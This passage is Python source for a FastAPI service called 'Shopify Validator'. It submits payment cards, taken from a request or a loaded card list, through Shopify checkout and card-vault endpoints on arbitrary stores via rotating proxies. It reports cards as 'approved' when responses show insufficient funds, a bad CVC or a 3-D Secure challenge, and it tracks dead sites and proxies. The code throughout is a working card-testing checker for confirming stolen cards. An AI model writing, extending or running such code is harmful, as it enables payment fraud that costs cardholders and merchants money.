                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full  = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken":   queue_token or "",
                    "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": first, "lastName": last,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {
                                "id": merch_id_full, "variantId": variant_id_full,
                                "properties": [], "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {
                                "value": {"amount": subtotal, "currencyCode": currency}
                            },
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True}, "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": state, "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency,
                                     "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0",
                                                          "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            ship_vars = _base_vars()
            try:
                r = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_SHIPPING,
                          "variables": ship_vars,
                          "operationName": "Proposal"},
                )
                resp_json = orjson.loads(r.content)
            except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError) as ex:
                if _looks_like_proxy_error(str(ex)):
                    return _r("PROXY_ERROR", message=str(ex)[:120],
                              proxy_dead=True, is_site_error=True)
                return _r("TIMEOUT", message=str(ex)[:120], is_site_error=True)

            data = resp_json.get("data", {}) or {}
            if not data.get("session"):
                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    interpreted = _parse_gql_errors(gql_errs)
                    return _r(interpreted, message=str(gql_errs[:1])[:120],
                              is_site_error=True)
                return _r("GRAPHQL_ERROR",
                          message="No session in shipping response",
                          is_site_error=True)

            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate = session_data.get("negotiate") or {}
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                # v4.6.3 (Fix 14): any negotiate.errors is fatal.
                code = _parse_gql_errors(neg_errors)
                if code in FINAL_CODES:
                    code = "SITE_ERROR"
                return _r(code, message=str(neg_errors[:1])[:120],
                          is_site_error=True)

            result_obj = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied",
                          is_site_error=True)
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED", message="Rate limited", is_site_error=True)
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED", message="Negotiation failed",
                          is_site_error=True)

            checkpoint_data = result_obj.get("checkpointData")
            seller = result_obj.get("sellerProposal") or {}
            if not seller:
                return _r("NO_SELLER_PROPOSAL", message="No seller proposal",
                          is_site_error=True)

            running_total_data = seller.get("runningTotal") or {}
            running_total = (
                running_total_data.get("value", {}).get("amount") or
                running_total_data.get("amount", "0")
            )

            delivery_data = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt_data = strategies[0].get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or
                                amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            tax_data = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or
                        tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            payment_data = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (
                            pm.get("extensibilityDisplayName") or
                            pm.get("name") or pm.get("brand") or
                            pm.get("displayName") or "Shopify Payments"
                        )
                        if ("shopify" in detected_gateway.lower()
                                and "payments" in detected_gateway.lower()):
                            payment_identifier = pid
                            gateway = detected_gateway
                            try:
                                price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            except (ValueError, TypeError):
                                price = "0.00"
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                          message="Store does not use Shopify Payments",
                          is_site_error=True)

            if not delivery_strategy:
                return _r("NO_SELLER_PROPOSAL",
                          message="No delivery strategy from proposal",
                          is_site_error=True)

            if validate_only:
                # v4.6.3 (Fix 16): Approved consistent with /check valid=True.
                return _r("SITE_VALIDATED", approved="True",
                          message="Valid site — products OK, gateway OK, checkout OK "
                                  "(card not tested)",
                          is_site_error=False)

            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(month),
                    "year": int(f"20{year}"),
                    "verification_value": cvv,
                    "name": f"{first} {last}",
                    "start_month": None, "start_year": None,
                    "issue_number": "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": ua,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            token = None
            try:
                vr = await session.post(
                    "https://checkout.pci.shopifyinc.com/sessions",
                    json=vault_payload, headers=vault_headers,
                )
                vd = orjson.loads(vr.content)
                token = vd.get("id")
            except Exception as ex:
                if _looks_like_proxy_error(str(ex)):
                    return _r("PROXY_ERROR", message=str(ex)[:120],
                              proxy_dead=True, is_site_error=True)

            if not token:
                return _r("TOKENIZATION_FAILED",
                          message="Card vault rejected tokenization",
                          is_site_error=True)

            billing_addr = {"streetAddress": {
                "address1": street, "address2": "", "city": city,
                "countryCode": country_code, "postalCode": s_zip,
                "firstName": first, "lastName": last,
                "zoneCode": state, "phone": phone,
            }}

            def _build_submit_body() -> dict:
                submit_deliv_line = {
                    "destination": {"streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {"phone": phone},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": False,
                }
                submit_merch = {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {
                            "id": merch_id_full, "variantId": variant_id_full,
                            "properties": [], "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponentsSource": None, "lineComponents": [],
                    }]
                }
                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput": {"sessionToken": sst},
                            "queueToken": queue_token or "",
                            "discounts": {"lines": [],
                                          "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines": [submit_deliv_line],
                                "noDeliveryRequired": [],
                                "useProgressiveRates": True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": True,
                            },
                            "merchandise": submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {"directPaymentMethod": {
                                        "paymentMethodIdentifier": payment_identifier,
                                        "sessionId": token,
                                        "billingAddress": billing_addr,
                                        "cardSource": None,
                                    }},
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity": copy.deepcopy(ship_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations": None,
                                "proposedTotalAmount": {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions": [],
                            },
                            "tip": {"tipLines": []},
                            "note": {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties": {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data}
                               if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            try:
                sr = await session.post(
                    graphql_url,
                    params={"operationName": "SubmitForCompletion"},
                    headers=gql_headers, json=_build_submit_body(),
                )
                s_resp = orjson.loads(sr.content)
                _sub_sst = sr.headers.get("x-checkout-one-session-token")
                if _sub_sst:
                    sst = _sub_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except (asyncio.TimeoutError, RequestsError) as ex:
                if _looks_like_proxy_error(str(ex)):
                    return _r("PROXY_ERROR", message=str(ex)[:120],
                              proxy_dead=True, is_site_error=True)
                return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
            except orjson.JSONDecodeError as ex:
                return _r("SITE_ERROR",
                          message=f"Malformed submit response: {str(ex)[:100]}",
                          is_site_error=True)
            except Exception as ex:
                if _looks_like_proxy_error(str(ex)):
                    return _r("PROXY_ERROR", message=str(ex)[:120],
                              proxy_dead=True, is_site_error=True)
                return _r("SUBMIT_FAILED",
                          message=f"{type(ex).__name__}: {str(ex)[:100]}",
                          is_site_error=True)

            s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
            if not s_data:
                errs = s_resp.get("errors") or []
                if errs:
                    # v4.6.4 (Fix 1): return the FIRST non-empty normalized
                    # value even when it maps to CARD_DECLINED. Only fall
                    # through to GRAPHQL_ERROR when there is nothing to
                    # interpret at all.
                    for err_item in errs:
                        for fld in ("code", "message"):
                            val = str(err_item.get(fld) or "").strip().upper()
                            if not val:
                                continue
                            norm = _normalize_response(val)
                            approved = (
                                "True"
                                if norm in ("INSUFFICIENT_FUNDS",
                                            "INVALID_CVC",
                                            "3DS_REQUIRED")
                                else "False"
                            )
                            return _r(norm, approved=approved,
                                      message=val[:120])
                return _r("GRAPHQL_ERROR", message="Empty submit response",
                          is_site_error=True)

            stype = s_data.get("__typename", "")

            if stype in ("SubmitSuccess", "SubmittedForCompletion",
                         "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype = receipt.get("__typename", "")
                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True",
                              message="Order placed successfully")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True",
                              message="3D Secure challenge required")
                if rtype == "FailedReceipt":
                    pe = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    if pe_type in ("InventoryClaimFailure",
                                   "InventoryReservationFailure"):
                        return _r("NO_PRODUCT", message="Inventory failure",
                                  is_site_error=True,
                                  hard_dead_code="NO_PRODUCT")
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED",
                                  message="Order creation failure",
                                  is_site_error=True)
                    code = str(pe.get("code") or "").upper()
                    msg = str(pe.get("messageUntranslated") or "").upper()
                    raw = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = (
                        "True"
                        if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                    "3DS_REQUIRED")
                        else "False"
                    )
                    return _r(norm, approved=approved,
                              message=(code or msg or norm)[:120])

                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query": QUERY_POLL,
                        "variables": {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    for _poll_delay in (0.2, 0.4, 0.6, 0.9, 1.2):
                        await asyncio.sleep(_poll_delay)
                        try:
                            pr = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers, json=poll_body,
                            )
                            pd = (orjson.loads(pr.content)).get("data", {}) \
                                .get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True",
                                          approved="True",
                                          message="Order placed successfully")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True",
                                          message="3D Secure challenge required")
                            if pt == "FailedReceipt":
                                pe = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure",
                                               "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT",
                                              message="Inventory failure",
                                              is_site_error=True,
                                              hard_dead_code="NO_PRODUCT")
                                code = str(pe.get("code") or "").upper()
                                msg = str(pe.get("messageUntranslated") or "").upper()
                                if code == "CAPTCHA_REQUIRED":
                                    return _r("CAPTCHA_REQUIRED",
                                              approved="False",
                                              message="Captcha required",
                                              is_site_error=True)
                                raw = code if code and code not in ("GENERIC_ERROR",
                                                                    "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = (
                                    "True"
                                    if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                "3DS_REQUIRED")
                                    else "False"
                                )
                                return _r(norm, approved=approved,
                                          message=(code or msg or norm)[:120])
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                continue
                            break
                        except asyncio.CancelledError:
                            raise
                        except Exception as e:
                            log.debug("poll error: %s", e)
                            continue

                return _r("CARD_DECLINED", message="Unclassified receipt response")

            if stype == "SubmitFailed":
                reason = str(s_data.get("reason") or "")
                return _r(_normalize_response(reason), message=reason[:120])

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                if errs:
                    best_code = "CARD_DECLINED"
                    best_msg = ""
                    for err_item in errs:
                        for fld in ("code", "nonLocalizedMessage",
                                    "localizedMessage", "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                best_msg = val
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = (
                        "True"
                        if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                         "3DS_REQUIRED")
                        else "False"
                    )
                    return _r(best_code, approved=approved,
                              message=(best_msg or best_code)[:120])
                return _r("CARD_DECLINED", message="No error detail")

            if stype == "Throttled":
                return _r("THROTTLED", message="Throttled by Shopify",
                          is_site_error=True)
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied",
                          is_site_error=True)

            return _r("CARD_DECLINED", message=f"Unknown submit type: {stype}")

        except (asyncio.TimeoutError, RequestsError) as ex:
            if _looks_like_proxy_error(str(ex)):
                return _r("PROXY_ERROR", message=str(ex)[:120],
                          proxy_dead=True, is_site_error=True)
            return _r("TIMEOUT", message="Request timed out", is_site_error=True)
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
            if _looks_like_proxy_error(err_str):
                return _r("PROXY_ERROR", message=err_str,
                          proxy_dead=True, is_site_error=True)
            return _r("SITE_ERROR", message=err_str, is_site_error=True)
        finally:
            await _close_session(session)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FASTAPI APP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

app = FastAPI(title="Shopify Validator", version="4.6.4")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
async def _startup_shared():
    global _cache_sweeper_task
    if _shared:
        try:
            await _shared.start()
        except Exception as e:
            log.warning("shared_state start failed: %s", e)
    _cache_sweeper_task = asyncio.create_task(_cache_sweeper())

@app.on_event("shutdown")
async def _shutdown_shared():
    global _cache_sweeper_task
    if _cache_sweeper_task:
        _cache_sweeper_task.cancel()
        try:
            await _cache_sweeper_task
        except Exception:
            pass
        _cache_sweeper_task = None
    if _shared:
        try:
            await _shared.stop()
        except Exception:
            pass

def _resolve_proxy_param(proxy: Optional[str], proxies: Optional[str]) -> tuple[Optional[str], list[str]]:
    param = proxies or proxy
    return _pick_proxy(param)

def _proxy_rejection_response(rejected: list[str]) -> JSONResponse:
    return JSONResponse({
        "Response":   "PROXY_ERROR",
        "Message":    f"All {len(rejected)} proxies dead/in cooldown",
        "code":       "PROXY_ERROR",
        "Status":     False,
        "Retry":      True,
        "SkipSite":   False,
        "Proxy":      "Dead",
        "Gateway":    "Shopify Payments",
        "Price":      "0.00",
        "Time":       "0s",
        "Rejected":   rejected,
    })

async def _clear_shared_hard_dead() -> None:
    if not (_shared and _shared.enabled):
        return
    try:
        public_clear = getattr(_shared, "clear_hard_dead", None)
        if callable(public_clear):
            res = public_clear()
            if asyncio.iscoroutine(res):
                await res
            return
    except Exception as e:
        log.warning("shared_state.clear_hard_dead failed: %s", e)
        return
    try:
        client = getattr(_shared, "_client", None)
        if client is not None:
            keys = [k async for k in client.scan_iter(match="hd:*", count=500)]
            if keys:
                await client.delete(*keys)
        hard_dead = getattr(_shared, "_hard_dead", None)
        if hard_dead is not None:
            hard_dead.clear()
    except Exception as e:
        log.warning("Redis clear failed: %s", e)

@app.get("/shopify")
async def shopify_route(
    site:           Optional[str]   = Query(None),
    cc:             Optional[str]   = Query(None),
    proxy:          Optional[str]   = Query(None),
    proxies:        Optional[str]   = Query(None),
    max_price:      Optional[float] = Query(None),
    key:            Optional[str]   = Query(None),
    fallback_sites: Optional[str]   = Query(None),
    attempts:       Optional[int]   = Query(None),
    auto:           Optional[bool]  = Query(None),
    validate_only:  Optional[bool]  = Query(None),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse({"error": "Bad card format."}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available."}, status_code=400)
        card = random.choice(cards)

    chosen_proxy, rejected = _resolve_proxy_param(proxy, proxies)
    if rejected and not chosen_proxy:
        return _proxy_rejection_response(rejected)

    site_norm = _normalize_site(site) if site else None
    if not site_norm:
        return JSONResponse({
            "error":      "`site` parameter required (auto mode removed in v4.6.0)",
            "Response":   "NO_SITES",
            "Message":    "Client must pass a single site; bot handles rotation",
            "Status":     False,
            "Retry":      False,
            "SkipSite":   True,
            "Proxy":      "Live",
            "Gateway":    "Shopify Payments",
            "Price":      "0.00",
            "Time":       "0s",
        }, status_code=400)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site_norm, proxy_str=chosen_proxy, max_price=max_price,
        validate_only=bool(validate_only),
    )
    host = urlparse(result.get("Site") or site_norm).netloc
    code = str(result.get("Response", "")).upper()
    if code not in PROXY_STOP_CODES:
        _record_site_result(host, code)
    result["Retry"] = code in TRANSIENT_CODES
    return JSONResponse(result)

@app.get("/check")
async def check_route(
    site:      str            = Query(...),
    card:      Optional[str]  = Query(None),
    proxy:     Optional[str]  = Query(None),
    proxies:   Optional[str]  = Query(None),
    max_price: Optional[float] = Query(None),
    key:       Optional[str]  = Query(None),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse({"error": "Bad card format."}, status_code=400)
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse({"error": "No cards available."}, status_code=400)
        parsed = random.choice(cards)

    chosen_proxy, rejected = _resolve_proxy_param(proxy, proxies)
    if rejected and not chosen_proxy:
        return _proxy_rejection_response(rejected)

    ourl = _normalize_site(site)
    result = await validate_card(parsed["cc"], parsed["month"], parsed["year"],
                                 parsed["cvv"], ourl,
                                 proxy_str=chosen_proxy, max_price=max_price)
    response_code = result.get("Response", "")
    if response_code not in PROXY_STOP_CODES:
        _record_site_result(urlparse(ourl).netloc, response_code)
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": response_code,
        "gate":          result.get("Gateway", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
        "proxy_used":    result.get("ProxyUsed", "direct"),
    })

@app.get("/dead-sites")
async def dead_sites_route():
    now = time.time()
    if _shared and _shared.enabled:
        try:
            await _shared.refresh()
        except Exception:
            pass
    out = {}
    for host, entry in list(_HARD_DEAD_CACHE.items()):
        exp, hard_code = entry
        if now >= exp:
            continue
        out[host] = {
            "expires_in_sec":  int(exp - now),
            "hard_dead_code":  hard_code,
            "last_code":       _site_stats.get(host, {}).get("last_response", ""),
            "samples":         len(_site_stats.get(host, {}).get("outcomes", [])),
        }
    return JSONResponse({
        "count": len(out),
        "sites": out,
        "instruction": "Prune these hosts from sites.txt or MongoDB global_sites.",
    })

@app.post("/dead-sites/clear")
async def dead_sites_clear_route():
    n = len(_HARD_DEAD_CACHE)
    _HARD_DEAD_CACHE.clear()
    for s in _site_stats.values():
        s["blacklisted_until"] = 0
        s["outcomes"].clear()
    _site_throttle.clear()
    _HOST_COOLDOWN.clear()
    _HOST_HITS.clear()
    _HOST_LAST_SEEN.clear()
    await _clear_shared_hard_dead()
    return JSONResponse({"cleared": n})

@app.get("/health")
async def health_route():
    cards = _get_cards()
    now = time.time()
    return JSONResponse({
        "status":             "ok",
        "version":            "4.6.4",
        "mode":               "stateless-single-site",
        "shared_state":       (_shared.stats() if _shared else {"enabled": False}),
        "cards_loaded":       len(cards),
        "site_concurrency":   SITE_CONCURRENCY,
        "cache_ttl":          CACHE_TTL,
        "variant_ttl":        VARIANT_TTL,
        "request_timeout":    REQUEST_TIMEOUT,
        "max_price":          MAX_PRICE,
        "hard_max_price":     HARD_MAX_PRICE,
        "blacklist_threshold": BLACKLIST_THRESHOLD,
        "blacklist_samples":   BLACKLIST_SAMPLES,
        "blacklist_seconds":   BLACKLIST_SECONDS,
        "host_rate_limit":    _HOST_RATE_LIMIT,
        "host_cooldown_sec":  _HOST_COOLDOWN_SEC,
        "max_tracked_hosts":  MAX_TRACKED_HOSTS,
        "cached_products":    len(_product_cache),
        "cached_variants":    len(_variant_cache),
        "hard_dead_cached":   sum(1 for entry in _HARD_DEAD_CACHE.values() if now < entry[0]),
        "self_throttled":     sum(1 for u in _HOST_COOLDOWN.values() if now < u),
        "proxies_dead":       sum(1 for u in _PROXY_DEAD_UNTIL.values() if now < u),
        "hosts_tracked":      len(_HOST_LAST_SEEN),
    })

@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})

if __name__ == "__main__":
    uvicorn.run("api:app", host="0.0.0.0", port=PORT,
                workers=1, log_level=LOG_LEVEL.lower())
